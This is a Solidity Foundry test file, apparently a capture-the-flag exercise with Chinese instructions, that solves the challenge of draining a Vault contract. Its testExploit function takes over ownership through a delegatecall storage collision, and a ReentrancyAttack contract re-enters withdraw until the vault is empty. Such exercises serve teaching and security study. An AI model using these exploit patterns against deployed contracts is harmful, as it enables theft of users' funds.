// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Vault.sol";

/*
阅读代码  Vault.sol 及测试用例，在测试用例中 testExploit 函数添加一些代码，设法取出预先部署的 Vault 合约内的所有资金。
以便运行 forge test 可以通过所有测试。
可以在 Vault.t.sol 中添加代码，或加入新合约，但不要修改已有代码。
*/
contract VaultExploiter is Test {
    Vault public vault;
    VaultLogic public logic;

    address public owner = address(1);
    address public player = address(2);

    function setUp() public {
        vm.deal(owner, 1 ether);

        vm.startPrank(owner);
        logic = new VaultLogic(bytes32("0x1234"));
        vault = new Vault(address(logic));

        vault.deposit{value: 0.1 ether}();
        vm.stopPrank();
    }

    function testExploit() public {
        vm.deal(player, 1 ether);
        vm.startPrank(player);

        // add your hacker code.

        // 首先修改合约owner
        bytes32 password = bytes32(uint256(uint160(address(logic))));
        (bool success,) = address(vault).call(
            abi.encodeWithSignature("changeOwner(bytes32,address)", password, player)
        );
        // 开始攻击
        vault.openWithdraw();
        ReentrancyAttack attacker = new ReentrancyAttack(payable(address(vault)));
        attacker.attack{value: 0.01 ether}();

        require(vault.isSolve(), "solved");
        vm.stopPrank();
    }
}

contract ReentrancyAttack {
    Vault private vault;

    constructor(address payable _vaultAddress) {
        vault = Vault(_vaultAddress);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
        payable(msg.sender).transfer(address(this).balance);
    }

    // 重入攻击
    receive() external payable {
        if (address(vault).balance > 0) {
            vault.withdraw();
        }
    }
}